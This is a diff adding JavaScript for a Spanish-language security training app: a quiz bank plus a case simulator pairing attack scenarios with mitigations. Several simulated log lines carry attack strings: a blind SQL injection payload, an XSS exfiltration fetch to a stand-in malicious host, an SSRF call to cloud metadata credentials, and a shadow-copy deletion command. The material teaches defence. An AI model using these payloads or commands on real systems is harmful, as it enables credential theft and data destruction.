+                    'Porque el navegador del cliente tiene activadas las cookies con el atributo HttpOnly.'
+                ],
+                correctIndex: 0,
+                explanation: 'Al concatenar texto sin parametrizar, el motor SQL interpreta las comillas y el operador OR como comandos lógicos en lugar de simples datos literales.'
+            },
+            {
+                cat: '🌐 Ataques a Redes',
+                q: '¿Por qué un ataque de Packet Sniffing puro (en modo promiscuo o wiretapping) se clasifica como un ataque PASIVO?',
+                options: [
+                    'Porque el atacante solo intercepta y lee el tráfico que circula por el medio sin modificar paquetes ni alterar el funcionamiento del sistema.',
+                    'Porque solo funciona cuando el servidor objetivo se encuentra apagado o en modo de suspensión.',
+                    'Porque requiere que el atacante envíe millones de paquetes SYN por segundo para saturar la tarjeta de red.',
+                    'Porque modifica activamente los registros de la base de datos pero borra los logs al terminar.'
+                ],
+                correctIndex: 0,
+                explanation: 'Los ataques pasivos comprometen la Confidencialidad espiando la información sin alterar los datos (Integridad) ni interrumpir el servicio (Disponibilidad).'
+            },
+            {
+                cat: '💻 Sistemas Operativos',
+                q: '¿Por qué un Rootkit de modo Kernel (Ring 0) o un Bootkit UEFI es tan difícil de detectar desde el propio Sistema Operativo infectado?',
+                options: [
+                    'Porque opera con el máximo privilegio del procesador (Ring 0 o previo al SO) y puede interceptar las llamadas al sistema (Syscalls) para mentirle al antivirus.',
+                    'Porque se aloja exclusivamente dentro de la memoria caché del navegador web Chrome.',
+                    'Porque utiliza direcciones IPv6 que los sistemas operativos actuales no pueden registrar en sus logs.',
+                    'Porque solo se ejecuta en servidores de bases de datos SQL que no tienen disco duro.'
+                ],
+                correctIndex: 0,
+                explanation: 'Al controlar Ring 0 o el firmware UEFI antes de que arranque el kernel, el rootkit filtra la lista de procesos y archivos que el propio SO devuelve a las herramientas de seguridad.'
+            },
+            {
+                cat: '🗄️ Ataques a Servicios (Correo)',
+                q: 'Para proteger el servicio de correo corporativo frente a suplantación de dominio en ataques de Spear Phishing y Whaling, ¿qué trío de protocolos DNS/SMTP se debe configurar?',
+                options: [
+                    'SPF (servidores autorizados), DKIM (firma criptográfica del mensaje) y DMARC (política de rechazo y reporte).',
+                    'ARP, ICMP y BGP en modo promiscuo dentro del controlador de dominio.',
+                    'ASLR, DEP y Stack Canaries en el cliente de correo del teléfono móvil.',
+                    'SYN Cookies, VLAN Hopping y Port Security en el switch de acceso.'
+                ],
+                correctIndex: 0,
+                explanation: 'SPF valida la IP emisora, DKIM garantiza con firma digital que el correo no fue alterado y procede del dominio legítimo, y DMARC ordena rechazar (p=reject) los correos que fallen.'
+            },
+            {
+                cat: '🌐 Ataques a Redes',
+                q: 'En un ataque DDoS de tipo TCP SYN Flood, ¿cómo protegen las "SYN Cookies" la disponibilidad del servidor?',
+                options: [
+                    'El servidor no reserva memoria en su cola de conexiones al recibir el SYN, sino que codifica el estado en el número de secuencia SYN-ACK y solo reserva recursos cuando recibe el ACK real.',
+                    'El servidor instala una cookie JavaScript en el navegador del atacante para bloquear su dirección MAC.',
+                    'El router cifra todos los paquetes UDP con una clave simétrica compartida con el switch.',
+                    'El firewall apaga automáticamente la interfaz de red durante 30 minutos cada vez que recibe un paquete SYN.'
+                ],
+                correctIndex: 0,
+                explanation: 'Las SYN Cookies evitan que la tabla de conexiones semiabiertas (backlog queue) se llene con peticiones falsas que nunca envían el tercer paso (ACK) del handshake.'
+            },
+            {
+                cat: '💻 Sistemas Operativos',
+                q: 'En sistemas Windows, ¿en qué consiste el ataque Pass-the-Hash (PtH) tras comprometer el proceso LSASS?',
+                options: [
+                    'El atacante utiliza directamente el hash NTLM robado de la memoria para autenticarse en otros servidores de la red sin necesidad de conocer la contraseña en texto plano.',
+                    'El atacante intercepta el cable de fibra óptica para leer los pulsos de luz del teclado USB.',
+                    'El atacante inyecta código JavaScript en el navegador para robar la cookie de un foro público.',
+                    'El atacante satura el servidor DNS con millones de consultas recursivas hasta agotar su CPU.'
+                ],
+                correctIndex: 0,
+                explanation: 'En la autenticación NTLM clásica, el hash equivale funcionalmente a la contraseña. Proteger LSASS con Credential Guard (VBS) y deshabilitar NTLM mitiga este vector.'
+            },
+            {
+                cat: '🗄️ Ataques a Servicios (Web)',
+                q: '¿Qué atributo de seguridad en una cookie de sesión impide que un ataque Cross-Site Scripting (XSS) pueda leerla mediante document.cookie en JavaScript?',
+                options: [
+                    'El flag HttpOnly en la cabecera Set-Cookie.',
+                    'El puerto 8080 en la URL del navegador.',
+                    'El registro MX en la zona pública del servidor DNS.',
+                    'La desactivación de la memoria virtual (Swap) en el servidor Linux.'
+                ],
+                correctIndex: 0,
+                explanation: 'El atributo HttpOnly prohíbe que el motor JavaScript del navegador acceda a la cookie, evitando su exfiltración directa mediante scripts inyectados por XSS.'
+            },
+            {
+                cat: '🦠 Programas Malignos (Malware)',
+                q: '¿Por qué el Ransomware moderno de "doble extorsión" compromete tanto la Disponibilidad como la Confidencialidad de la arquitectura?',
+                options: [
+                    'Porque primero roba una copia de los datos sensibles hacia servidores externos (Confidencialidad) y después cifra los sistemas impidiendo operar (Disponibilidad).',
+                    'Porque cifra dos veces el mismo archivo usando primero MD5 y luego código binario en la caché ARP.',
+                    'Porque apaga los ventiladores del centro de datos y al mismo tiempo cambia las rutas BGP de Internet.',
+                    'Porque solo infecta teléfonos móviles y bloquea simultáneamente la pantalla táctil y el micrófono.'
+                ],
+                correctIndex: 0,
+                explanation: 'Aunque la empresa recupere la Disponibilidad restaurando sus backups, el atacante amenaza con publicar los datos exfiltrados (fuga de Confidencialidad).'
+            },
+            {
+                cat: '🗄️ Ataques a Servicios (Cloud/API)',
+                q: 'En un servidor alojado en la nube (AWS/GCP/Azure), ¿por qué es tan peligroso un ataque SSRF (Server-Side Request Forgery) que apunta a la IP 169.254.169.254?',
+                options: [
+                    'Porque esa IP corresponde al servicio interno de metadatos de la instancia Cloud y permite al atacante robar las credenciales temporales IAM del servidor.',
+                    'Porque esa IP es la dirección de broadcast global que formatea automáticamente todos los discos SSD.',
+                    'Porque permite sobrescribir el firmware UEFI de los teléfonos móviles conectados al Wi-Fi.',
+                    'Porque desactiva el cifrado WPA3 del punto de acceso inalámbrico de la oficina.'
+                ],
+                correctIndex: 0,
+                explanation: 'El servidor hace la petición a 169.254.169.254 desde dentro de sí mismo y devuelve las llaves IAM al atacante. Se mitiga con IMDSv2 (basado en tokens PUT) y filtrado de URLs.'
+            },
+            {
+                cat: '🌐 Ataques a Redes',
+                q: '¿Qué propiedad de seguridad garantiza DNSSEC frente a un ataque de DNS Cache Poisoning?',
+                options: [
+                    'La Integridad y Autenticidad de los registros DNS mediante firmas criptográficas de clave pública, aunque no cifra el contenido de la consulta.',
+                    'El ocultamiento total de la dirección IP del cliente como si fuera una red Tor o VPN.',
+                    'La protección física contra cortes eléctricos en los armarios de telecomunicaciones.',
+                    'La prevención de desbordamientos de pila (Buffer Overflow) en aplicaciones escritas en C.'
+                ],
+                correctIndex: 0,
+                explanation: 'DNSSEC firma digitalmente los registros DNS para que el resolver compruebe que la respuesta no ha sido falsificada en tránsito.'
+            },
+            {
+                cat: '💻 Sistemas Operativos',
+                q: '¿Qué vulnerabilidad arquitectónica explotan ataques como Meltdown y Spectre en el procesador y el Sistema Operativo?',
+                options: [
+                    'La ejecución especulativa y fuera de orden de la CPU, dejando rastros medibles por tiempo en la memoria caché (ataque de canal lateral).',
+                    'La falta de contraseñas en los archivos comprimidos ZIP enviados por correo electrónico.',
+                    'La concatenación de cadenas SQL en los formularios de inicio de sesión PHP.',
+                    'El envío masivo de tramas ARP de difusión en redes locales sin VLAN.'
+                ],
+                correctIndex: 0,
+                explanation: 'Aunque la CPU descarta arquitectónicamente las instrucciones especulativas no permitidas, sus efectos colaterales quedan en la caché L1 y pueden medirse con un cronómetro de alta precisión.'
+            },
+            {
+                cat: '🗄️ Ataques a Servicios (Directorio Activo)',
+                q: '¿Por qué el ataque de Kerberoasting es tan sigiloso dentro de una red corporativa con Active Directory?',
+                options: [
+                    'Porque cualquier usuario autenticado puede pedir legítimamente un ticket TGS de servicio al controlador de dominio y luego romper la contraseña offline sin generar alertas de login fallido.',
+                    'Porque no utiliza la red en ningún momento y requiere desmontar físicamente el disco duro del servidor.',
+                    'Porque borra todas las tablas de enrutamiento de los routers Cisco antes de pedir el ticket.',
+                    'Porque solo envía paquetes durante un milisegundo a través del puerto de impresora paralelo.'
+                ],
+                correctIndex: 0,
+                explanation: 'Solicitar un ticket TGS es una operación normal en Kerberos; el crackeo por fuerza bruta ocurre fuera de línea en la máquina del atacante.'
+            },
+            {
+                cat: '🎣 Autenticación y MFA',
+                q: 'Un atacante monta un proxy inverso transparente (como Evilginx) para realizar Phishing en tiempo real y capturar tanto la contraseña como el código OTP de 6 dígitos. ¿Qué método de autenticación resiste este ataque?',
+                options: [
+                    'Llaves de seguridad o Passkeys basadas en FIDO2 / WebAuthn, porque vinculan criptográficamente la firma al dominio real del navegador.',
+                    'Recibir el código de 6 dígitos por mensaje SMS tradicional en lugar de por correo.',
+                    'Obligar a cambiar la contraseña cada 15 días añadiendo un signo de exclamación al final.',
+                    'Ocultar el formulario de login detrás de una imagen CAPTCHA de semáforos.'
+                ],
+                correctIndex: 0,
+                explanation: 'FIDO2/WebAuthn verifica el origen exacto (dominio real) en el navegador; si el usuario está en un dominio falso del proxy, la firma criptográfica no es válida para el sitio real.'
+            },
+            {
+                cat: '🦠 Programas Malignos (Malware)',
+                q: '¿Cuál es la característica definitoria de un Troyano (Trojan / RAT) frente a un Gusano de red (Worm)?',
+                options: [
+                    'El Troyano se disfraza de software legítimo para engañar al usuario y que lo ejecute, mientras que el Gusano se propaga automáticamente por la red explotando vulnerabilidades sin intervención humana.',
+                    'El Troyano solo afecta a cables de red RJ45 y el Gusano solo afecta a pantallas OLED.',
+                    'El Troyano es un ataque pasivo que nunca ejecuta código y el Gusano es una copia de seguridad.',
+                    'No hay ninguna diferencia; ambos términos significan exactamente inyección SQL.'
+                ],
+                correctIndex: 0,
+                explanation: 'El Troyano necesita engañar al usuario aparentando ser un programa útil, tras lo cual abre una puerta trasera o conexión C2.'
+            },
+            {
+                cat: '🛡️ Arquitectura de Seguridad (CIA+)',
+                q: 'Si un ciberataque modifica silenciosamente el importe y el IBAN de destino de las transferencias en la base de datos bancaria sin apagar el servidor ni robar datos, ¿qué propiedad fundamental ha vulnerado principalmente?',
+                options: [
+                    'La Integridad de la información.',
+                    'Únicamente la Disponibilidad del hardware.',
+                    'El ancho de banda físico de la fibra óptica.',
+                    'La refrigeración térmica del procesador.'
+                ],
+                correctIndex: 0,
+                explanation: 'La Integridad garantiza que la información sea exacta y no haya sido alterada ni manipulada de forma no autorizada.'
+            }
+        ];
+
+        // Estado del Juego 1 (Quiz)
+        let quizDeck = [];
+        let quizIndex = 0;
+        let quizLives = 3;
+        let quizScore = 0;
+        let quizStreak = 0;
+        let quizLocked = false;
+
+        /**
+         * Inicializa o reinicia el Juego 1 (Test Quiz) con 3 vidas y baraja todas las preguntas
+         * para que salgan en orden aleatorio y sin repetirse.
+         */
+        function initQuizGame() {
+            quizDeck = shuffleArray(QUIZ_QUESTIONS_BANK);
+            quizIndex = 0;
+            quizLives = 3;
+            quizScore = 0;
+            quizStreak = 0;
+            quizLocked = false;
+
+            document.getElementById('quizPlayArea').style.display = 'block';
+            document.getElementById('quizEndPanel').classList.remove('show');
+            updateQuizHud();
+            renderQuizQuestion();
+        }
+
+        /**
+         * Actualiza los corazones de las 3 vidas, la puntuación y el contador de progreso del Quiz.
+         */
+        function updateQuizHud() {
+            const hearts = '❤️'.repeat(quizLives) + '🖤'.repeat(3 - quizLives);
+            document.getElementById('quizLivesDisplay').textContent = hearts;
+            document.getElementById('quizScoreDisplay').textContent = quizScore;
+            document.getElementById('quizProgressDisplay').textContent = `${Math.min(quizIndex + 1, quizDeck.length)} / ${quizDeck.length}`;
+            document.getElementById('quizStreakBadge').textContent = `🔥 Racha: ${quizStreak}`;
+        }
+
+        /**
+         * Muestra la pregunta actual del mazo barajado y mezcla también el orden de sus 4 respuestas.
+         */
+        function renderQuizQuestion() {
+            quizLocked = false;
+            const currentQ = quizDeck[quizIndex];
+
+            document.getElementById('quizCatBadge').textContent = currentQ.cat;
+            document.getElementById('quizQuestionText').textContent = currentQ.q;
+            document.getElementById('quizFeedbackBox').classList.remove('show');
+
+            // Preparar y barajar las 4 opciones para que la respuesta correcta cambie siempre de letra
+            const optionObjects = currentQ.options.map((text, idx) => ({
+                text,
+                isCorrect: idx === currentQ.correctIndex
+            }));
+            const shuffledOptions = shuffleArray(optionObjects);
+
+            const letters = ['A', 'B', 'C', 'D'];
+            const listEl = document.getElementById('quizOptionsList');
+            listEl.innerHTML = shuffledOptions.map((opt, i) => `
+                <button class="option-btn" onclick="handleQuizAnswer(this, ${opt.isCorrect})">
+                    <span class="option-letter">${letters[i]}</span>
+                    <span>${opt.text}</span>
+                </button>
+            `).join('');
+
+            updateQuizHud();
+        }
+
+        /**
+         * Evalúa la respuesta pulsada en el Quiz, resta vida si falla y comprueba Game Over.
+         */
+        function handleQuizAnswer(btnEl, isCorrect) {
+            if (quizLocked) return;
+            quizLocked = true;
+
+            const currentQ = quizDeck[quizIndex];
+            const allBtns = document.querySelectorAll('#quizOptionsList .option-btn');
+            allBtns.forEach(b => b.disabled = true);
+
+            const fbBox = document.getElementById('quizFeedbackBox');
+            const fbTitle = document.getElementById('quizFeedbackTitle');
+            const fbText = document.getElementById('quizFeedbackText');
+
+            if (isCorrect) {
+                btnEl.classList.add('correct');
+                playTone('hit');
+                quizStreak++;
+                quizScore += 100 + (quizStreak * 20);
+                fbTitle.textContent = '✅ ¡Correcto! (+' + (100 + quizStreak * 20) + ' pts)';
+                fbTitle.style.color = 'var(--accent-green)';
+            } else {
+                btnEl.classList.add('wrong');
+                // Resaltar cuál era la correcta para aprender del fallo
+                allBtns.forEach(b => {
+                    if (b.getAttribute('onclick').includes('true')) {
+                        b.classList.add('correct');
+                    }
+                });
+                playTone('miss');
+                quizLives--;
+                quizStreak = 0;
+                fbTitle.textContent = `❌ Respuesta incorrecta (Te quedan ${quizLives} vidas)`;
+                fbTitle.style.color = 'var(--accent-red)';
+            }
+
+            updateQuizHud();
+            fbText.textContent = currentQ.explanation;
+            fbBox.classList.add('show');
+        }
+
+        /**
+         * Avanza a la siguiente pregunta o muestra la pantalla de Game Over si perdió las 3 vidas.
+         */
+        function nextQuizQuestion() {
+            if (quizLives <= 0) {
+                showQuizEndScreen(false);
+                return;
+            }
+            quizIndex++;
+            if (quizIndex >= quizDeck.length) {
+                showQuizEndScreen(true);
+                return;
+            }
+            renderQuizQuestion();
+        }
+
+        function showQuizEndScreen(victory) {
+            document.getElementById('quizPlayArea').style.display = 'none';
+            const panel = document.getElementById('quizEndPanel');
+            panel.classList.add('show');
+
+            if (victory) {
+                document.getElementById('quizEndIcon').textContent = '🏆';
+                document.getElementById('quizEndTitle').textContent = '¡Test Completado con Éxito!';
+                document.getElementById('quizEndDesc').textContent =
+                    `Has respondido las ${quizDeck.length} preguntas sin perder tus 3 vidas. Puntuación final: ${quizScore} puntos.`;
+            } else {
+                document.getElementById('quizEndIcon').textContent = '💀';
+                document.getElementById('quizEndTitle').textContent = '¡Has agotado tus 3 vidas!';
+                document.getElementById('quizEndDesc').textContent =
+                    `Llegaste a la pregunta ${quizIndex + 1} de ${quizDeck.length} con ${quizScore} puntos. ¡Vuelve a intentarlo con un orden aleatorio nuevo!`;
+            }
+        }
+
+        /* =====================================================================
+           5. PARTE 3: SIMULADOR DE CASOS COMPLICADOS (DOBLE FASE: ATAQUE + SOLUCIÓN)
+           Las opciones incorrectas se extraen dinámicamente de los otros casos reales
+           del banco para que tengan la misma longitud y tecnicismo y no sean evidentes.
+           ===================================================================== */
+        const CASES_DATABASE = [
+            {
+                id: 'case-1',
+                layer: '🌐 Capa de Red (LAN Corporativa)',
+                scenario: 'Los analistas del departamento financiero notan avisos esporádicos de certificado al abrir la intranet, pero siguen trabajando. Ningún servidor se ha caído ni hay picos de tráfico inusuales.',
+                log: '[SWITCH-SW02] ARP Table Change: IP 10.20.1.1 (Gateway) moved from MAC 00:1a:2b:cc:01 to MAC 00:50:56:ef:99 (Port Gi0/14)',
+                attackName: 'ARP Spoofing / Envenenamiento ARP con interceptación Man-in-the-Middle (MITM)',
+                solutionText: 'Activar Dynamic ARP Inspection (DAI) junto con DHCP Snooping en los switches de acceso y forzar HSTS/TLS estricto en los servicios internos.',
+                explanation: 'El puerto Gi0/14 está anunciando falsamente que la IP de la puerta de enlace (10.20.1.1) corresponde a su dirección MAC, redirigiendo el tráfico por su tarjeta antes de enviarlo al router.'
+            },
+            {
+                id: 'case-2',
+                layer: '🌐 Capa de Red (Perímetro TCP/IP)',
+                scenario: 'El portal de matrícula universitaria deja de responder a clientes legítimos. El uso de CPU y disco del servidor es bajo (12%), pero nadie logra establecer una conexión TCP nueva.',
+                log: '[NETSTAT] 65,535 sockets in state SYN_RECV from 48,200 distinct random source IPs. Complete 3-way handshakes: 0/sec.',
+                attackName: 'Ataque DDoS de agotamiento de estado por inundación TCP SYN Flood',
+                solutionText: 'Habilitar SYN Cookies en la pila TCP del sistema/firewall, reducir el temporizador synack_retries y desplegar mitigación Anti-DDoS en el borde.',
+                explanation: 'El atacante satura la tabla de conexiones semiabiertas (SYN_RECV) enviando paquetes SYN con IPs falsas que jamás responden al SYN-ACK.'
+            },
+            {
+                id: 'case-3',
+                layer: '🌐 Capa de Red (Resolución de Nombres)',
+                scenario: 'Varios empleados que usan el servidor DNS recursivo interno de la sucursal son redirigidos a un portal idéntico al del banco corporativo sin haber hecho clic en ningún enlace de correo.',
+                log: '[DNS-RESOLVER] Unsolicited DNS A-record response accepted on UDP port 53531 with matching 16-bit TXID before authoritative server reply.',
+                attackName: 'DNS Cache Poisoning (Envenenamiento de caché del servidor DNS recursivo)',
+                solutionText: 'Implementar validación criptográfica de firmas DNSSEC en el resolver, aleatorización de puertos origen (0x20 bit) y restringir la recursión solo a redes autorizadas.',
+                explanation: 'El atacante inyectó una respuesta UDP falsa adivinando el ID de transacción antes de que respondiera el servidor DNS autoritativo legítimo.'
+            },
+            {
+                id: 'case-4',
+                layer: '🌐 Capa de Red (Segmentación VLAN)',
+                scenario: 'Un pentester conectado a una roseta de la VLAN 10 (Invitados) consigue enviar tramas que alcanzan directamente a los servidores de producción situados en la VLAN 50 sin pasar por el firewall.',
+                log: '[TRUNK-CAPTURE] Ethernet Frame with Double 802.1Q Tag detected: Outer VLAN=1 (Native VLAN), Inner VLAN=50.',
+                attackName: 'VLAN Hopping mediante doble etiquetado 802.1Q (Double Tagging Attack)',
+                solutionText: 'Deshabilitar la negociación automática DTP (poner puertos en modo access explícito), cambiar la VLAN nativa a una ID no utilizada y podar VLANs en los trunks.',
+                explanation: 'Al coincidir la VLAN del atacante con la VLAN nativa del enlace troncal, el primer switch retira la etiqueta externa y reenvía el paquete con la segunda etiqueta hacia la VLAN 50.'
+            },
+            {
+                id: 'case-5',
+                layer: '💻 Sistema Operativo (Memoria y Procesos)',
+                scenario: 'Un servicio propietario escrito en C++ que procesa cabeceras de paquetes industriales falla brevemente y, milisegundos después, aparece un proceso /bin/sh corriendo con permisos de root.',
+                log: '[KERNEL-TRAP] strcpy() wrote 512 bytes into 128-byte stack frame; saved RIP overwritten with 0x7fffffffe4a0 (executable stack segment).',
+                attackName: 'Stack Buffer Overflow (Desbordamiento de búfer en pila con ejecución de Shellcode)',
+                solutionText: 'Recompilar el binario con Stack Canaries (-fstack-protector-strong), activar DEP/NX (pila no ejecutable), habilitar ASLR en el kernel y sustituir strcpy por funciones acotadas.',
+                explanation: 'La función no validó la longitud de entrada, sobrescribió el puntero de retorno RIP en la pila y saltó a ejecutar instrucciones inyectadas en la propia memoria RAM.'
+            },
+            {
+                id: 'case-6',
+                layer: '💻 Sistema Operativo (Núcleo y Arranque)',
+                scenario: 'El servidor muestra un tráfico saliente constante en el firewall perimetral hacia una IP externa por el puerto 443, pero al ejecutar ps, top o netstat dentro del servidor no aparece ningún proceso ni socket abierto.',
+                log: '[MEMORY-FORENSICS] Syscall table pointer sys_getdents64 and tcp4_seq_show point to unsigned memory module outside /lib/modules.',
+                attackName: 'Rootkit de modo Kernel (Ring 0) con secuestro de tabla de llamadas al sistema (Syscall Hooking)',
+                solutionText: 'Reiniciar desde medio limpio externo, habilitar UEFI Secure Boot con validación TPM, exigir firma criptográfica obligatoria de módulos del kernel y monitorizar integridad (FIM/EDR).',
+                explanation: 'El Rootkit ha modificado los punteros de las llamadas del núcleo (sys_getdents64) para filtrar y ocultar sus propios procesos y conexiones a cualquier herramienta del usuario.'
+            },
+            {
+                id: 'case-7',
+                layer: '💻 Sistema Operativo (Subsistema de Autenticación)',
+                scenario: 'Tras infectar una sola estación de trabajo de soporte técnico en Windows, el atacante salta en 4 minutos a 18 servidores del dominio como Administrador sin haber descifrado ninguna contraseña.',
+                log: '[EDR-ALERT] Process rundll32.exe opened handle PROCESS_VM_READ on lsass.exe; subsequent SMB logons detected using NTLM Hash authentication.',
+                attackName: 'Volcado de memoria LSASS (Credential Dumping) seguido de movimiento lateral Pass-the-Hash (PtH)',
+                solutionText: 'Activar Windows Credential Guard (aislamiento por virtualización VBS), configurar LSASS como proceso protegido (RunAsPPL), restringir NTLM y evitar que cuentas de administrador inicien sesión en equipos de usuario.',
+                explanation: 'El atacante extrajo el hash NTLM de la memoria de LSASS y lo reutilizó directamente para autenticarse por red sin necesitar la contraseña en texto plano.'
+            },
+            {
+                id: 'case-8',
+                layer: '💻 Sistema Operativo (Microarquitectura CPU)',
+                scenario: 'En un servidor físico multi-inquilino (Cloud compartido), una máquina virtual sin privilegios ejecuta cálculos intensivos midiendo tiempos de acceso a memoria en nanosegundos y logra reconstruir la clave privada RSA del hipervisor.',
+                log: '[PERF-COUNTERS] Anomalous rate of CLFLUSH instructions and L3 Cache Prime+Probe timing measurements across hyperthreading sibling cores.',
+                attackName: 'Ataque de Canal Lateral (Side-Channel) de caché de CPU y ejecución especulativa',
+                solutionText: 'Aplicar parches de microcódigo y aislamiento de tablas de páginas del kernel (KPTI), desactivar Hyper-Threading entre clientes distintos y usar algoritmos criptográficos de tiempo constante.',
+                explanation: 'El atacante mide cuánto tarda la CPU en leer líneas de caché (acierto vs fallo) para deducir qué ramas o posiciones de memoria ha utilizado el proceso criptográfico vecino.'
+            },
+            {
+                id: 'case-9',
+                layer: '🗄️ Capa de Servicios (Base de Datos y Backend)',
+                scenario: 'Aunque el portal web corporativo no muestra ningún mensaje de error en pantalla, un atacante automatiza miles de peticiones al buscador de productos y logra extraer tabla por tabla los hashes de los clientes.',
+                log: '[WAF-LOG] GET /catalogo?id=10+AND+IF(ASCII(SUBSTRING((SELECT+password+FROM+users+LIMIT+1),1,1))=97,SLEEP(5),0)',
+                attackName: 'Inyección SQL Ciega basada en Tiempo (Time-Based Blind SQL Injection)',
+                solutionText: 'Sustituir todas las consultas dinámicas por sentencias preparadas (Prepared Statements / consultas parametrizadas) en el código y aplicar mínimo privilegio al usuario de la base de datos.',
+                explanation: 'Como la web no devuelve errores ni datos en pantalla, el atacante inyecta condiciones IF con SLEEP(5): si el servidor tarda 5 segundos en responder, sabe que ha acertado la letra de la contraseña.'
+            },
+            {
+                id: 'case-10',
+                layer: '🗄️ Capa de Servicios (Aplicación Web)',
+                scenario: 'Los administradores del panel de soporte técnico ven secuestradas sus sesiones justo después de abrir los tickets de incidencia enviados por clientes externos a través del formulario de ayuda.',
+                log: '[HTTP-ACCESS] Ticket comment rendered raw in admin DOM; outbound fetch to https://cdn-metrics-evil.org/c?t=eyJhbGciOi... from Admin browser.',
+                attackName: 'Cross-Site Scripting Almacenado (Stored XSS) con exfiltración de Token de sesión',
+                solutionText: 'Aplicar codificación y saneamiento contextual de salida (Output Encoding) antes de renderizar datos en el DOM, configurar cookies con flag HttpOnly/Secure e implantar una cabecera Content-Security-Policy (CSP) estricta.',
+                explanation: 'El código JavaScript malicioso quedó guardado en la base de datos dentro del comentario del ticket y se ejecutó automáticamente en el navegador del administrador al visualizarlo.'
+            },
+            {
+                id: 'case-11',
+                layer: '🗄️ Capa de Servicios (Microservicios y Cloud)',
+                scenario: 'Una herramienta web que genera capturas de pantalla en PDF a partir de la URL que indica el usuario es utilizada por un atacante para extraer las llaves de administración de toda la cuenta AWS.',
+                log: '[PDF-RENDERER] Server-side HTTP GET request issued to http://169.254.169.254/latest/meta-data/iam/security-credentials/ProdAdminRole',
+                attackName: 'Server-Side Request Forgery (SSRF) contra el servicio interno de metadatos Cloud',
+                solutionText: 'Exigir IMDSv2 con token de sesión obligatorio (bloqueando peticiones GET simples a metadatos), filtrar y bloquear rangos de IPs privadas/link-local en el servidor y validar URLs mediante lista blanca.',
+                explanation: 'El servidor web fue engañado para realizar una petición HTTP desde sí mismo hacia la dirección interna 169.254.169.254 e imprimir las credenciales IAM dentro del PDF devuelto al atacante.'
+            },
+            {
+                id: 'case-12',
+                layer: '🗄️ Capa de Servicios (Directorio Activo / Identidad)',
+                scenario: 'Un atacante que solo dispone de una cuenta de becario sin privilegios en el dominio consigue obtener la contraseña de la cuenta de servicio de SQL Server sin haber provocado ni un solo intento fallido de login en el controlador de dominio.',
+                log: '[AD-SECURITY-LOG] Event ID 4769: Kerberos Service Ticket (TGS) requested for SPN MSSQLSvc/db01.corp.local with Encryption Type 0x17 (RC4-HMAC).',
+                attackName: 'Kerberoasting (Extracción de tickets TGS de cuentas de servicio SPN para crackeo offline)',
+                solutionText: 'Migrar las cuentas de servicio a cuentas gestionadas de grupo (gMSA) con contraseñas aleatorias de 120 caracteres, deshabilitar el cifrado débil RC4 y forzar AES-256 en Kerberos.',
+                explanation: 'El protocolo Kerberos entrega el ticket TGS cifrado con el hash de la cuenta de servicio a cualquier usuario del dominio; el atacante se lleva ese ticket y le aplica fuerza bruta con tarjetas gráficas fuera de línea.'
+            },
+            {
+                id: 'case-13',
+                layer: '🎣 Servicio de Correo e Identidad (Alta Dirección)',
+                scenario: 'El Director Financiero (CFO) recibe un correo aparentemente enviado desde la dirección exacta del Director General (CEO) adjuntando un contrato confidencial de adquisición urgente y pidiendo autorizar una transferencia internacional.',
+                log: '[SMTP-GATEWAY] Mail FROM: <ceo@empresa.es> accepted; domain empresa.es has no DMARC record and SPF ends with ?all (Neutral).',
+                attackName: 'Whaling (Spear Phishing dirigido a la alta dirección) con suplantación de dominio SMTP',
+                solutionText: 'Configurar registros SPF estrictos (-all), firma criptográfica DKIM y política DMARC en modo rechazo (p=reject), además de doble firma mancomunada fuera de banda para operaciones financieras.',
+                explanation: 'Al tratarse de un ataque diseñado a medida contra un alto ejecutivo (el CFO suplantando al CEO) aprovechando la falta de validación DMARC/SPF, corresponde a un caso clásico de Whaling.'
+            },
+            {
+                id: 'case-14',
+                layer: '🦠 Servicio de Archivos SMB y Endpoints (Malware)',
+                scenario: 'A las 03:00 AM, el tráfico de red interna SMB se dispara entre todos los servidores. Al llegar por la mañana, las bases de datos tienen extensión .locked y los atacantes amenazan con publicar 400 GB de contratos que copiaron el día anterior.',
+                log: '[EDR-TELEMETRY] Process vssadmin.exe delete shadows /all /quiet executed; massive file rename entropy > 7.99 bits/byte across SMB shares.',
+                attackName: 'Ransomware de doble extorsión con eliminación de copias de volumen (Shadow Copies) y propagación lateral SMB',
+                solutionText: 'Mantener copias de seguridad bajo regla 3-2-1 con almacenamiento inmutable (WORM/Air-gapped), bloquear la ejecución no autorizada de vssadmin mediante EDR y segmentar el tráfico SMB entre subredes.',
+                explanation: 'El comando vssadmin elimina las instantáneas locales de recuperación mientras el malware cifra masivamente los discos tras haber exfiltrado previamente información sensible.'
+            }
+        ];
+
+        // Estado del Juego 2 (Simulador de Casos en 2 Fases)
+        let casesDeck = [];
+        let caseIndex = 0;
+        let casePhase = 1; // 1 = Identificar Ataque, 2 = Elegir Solución
+        let caseLives = 3;
+        let caseScore = 0;
+        let caseLocked = false;
+
+        /**
+         * Inicia o reinicia el Juego 2 (Simulador de Casos) con 3 vidas y baraja todos los casos
+         * para que salgan sin repetirse.
+         */
+        function initCasesGame() {
+            casesDeck = shuffleArray(CASES_DATABASE);
+            caseIndex = 0;
+            casePhase = 1;
+            caseLives = 3;
+            caseScore = 0;
+            caseLocked = false;
+
+            document.getElementById('casePlayArea').style.display = 'block';
+            document.getElementById('caseEndPanel').classList.remove('show');
+            updateCaseHud();
+            renderCurrentCaseStep();
+        }
+
+        /**
+         * Actualiza el marcador de 3 vidas y puntos del Simulador de Casos.
+         */
+        function updateCaseHud() {
+            const hearts = '❤️'.repeat(caseLives) + '🖤'.repeat(3 - caseLives);
+            document.getElementById('caseLivesDisplay').textContent = hearts;
+            document.getElementById('caseScoreDisplay').textContent = caseScore;
+            document.getElementById('caseProgressDisplay').textContent =
+                `Caso ${Math.min(caseIndex + 1, casesDeck.length)} / ${casesDeck.length}`;
+        }
+
+        /**
+         * Genera 4 opciones mezcladas donde 1 es la verdadera del caso actual y las otras 3
+         * se extraen aleatoriamente de otros casos reales de la base de datos para que sea difícil.
+         */
+        function buildMixedCaseOptions(currentCase, fieldName) {
+            const otherCases = CASES_DATABASE.filter(c => c.id !== currentCase.id);
+            const randomDistractors = shuffleArray(otherCases).slice(0, 3).map(c => ({
+                text: c[fieldName],
+                isCorrect: false
+            }));
+
+            const allFour = [
+                { text: currentCase[fieldName], isCorrect: true },
+                ...randomDistractors
+            ];
+            return shuffleArray(allFour);
+        }
+
+        /**
+         * Renderiza la Fase 1 (Identificar ataque) o la Fase 2 (Elegir solución) del caso actual.
+         */
+        function renderCurrentCaseStep() {
+            caseLocked = false;
+            const currentCase = casesDeck[caseIndex];
+
+            document.getElementById('caseLayerBadge').textContent = currentCase.layer;
